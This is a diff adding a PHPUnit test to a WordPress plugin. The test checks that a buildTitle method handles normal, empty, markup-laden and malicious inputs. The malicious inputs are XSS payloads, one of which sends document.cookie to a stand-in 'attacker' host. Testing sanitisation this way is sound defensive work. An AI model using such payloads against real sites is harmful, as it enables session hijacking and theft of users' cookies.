@@ -154,4 +154,22 @@ class ToolTest extends \WP_UnitTestCase {
 		$this->assertFalse( $this->tool->validateRegistrationRequest() );
 	}
 
+	public function test_buildTitle() {
+		$happy_path     = [ 'Course Name 657', '2352', 'Read this book!', '8932' ];
+		$empty_path1     = [ '', '4321', '', '1234' ];
+		$empty_path2     = [ 'BIO-201:microbiology', '4321', '', '1234' ];
+		$markup_path    = [ '<b>Course Name 657</b>', '2352', '<span>Read this</span> book!', '8765' ];
+		$malicious_path = [
+			'<script>window.location=\'http://attacker/?cookie=\'+document.cookie</script>',
+			'<script>var keyword = location.search.substring(6);document.querySelector("em").innerHTML=keyword;)</script>',
+			'<script>bad.js</script>',
+			'123'
+		];
+		$this->assertEquals( 'Course Name 657: Read this book!', $this->tool->buildTitle( $happy_path[0], $happy_path[1], $happy_path[2], $happy_path[3] ) );
+		$this->assertEquals( 'Course ID 4321: Activity ID 1234', $this->tool->buildTitle( $empty_path1[0], $empty_path1[1], $empty_path1[2], $empty_path1[3] ) );
+		$this->assertEquals( 'BIO-201:microbiology: Activity ID 1234', $this->tool->buildTitle( $empty_path2[0], $empty_path2[1], $empty_path2[2], $empty_path2[3] ) );
+		$this->assertEquals( 'Course Name 657: Read this book!', $this->tool->buildTitle( $markup_path[0], $markup_path[1], $markup_path[2], $markup_path[3] ) );
+		$this->assertEquals( 'Untitled', $this->tool->buildTitle( $malicious_path[0], $malicious_path[1], $malicious_path[2], $malicious_path[3] ) );
+	}
+
 }
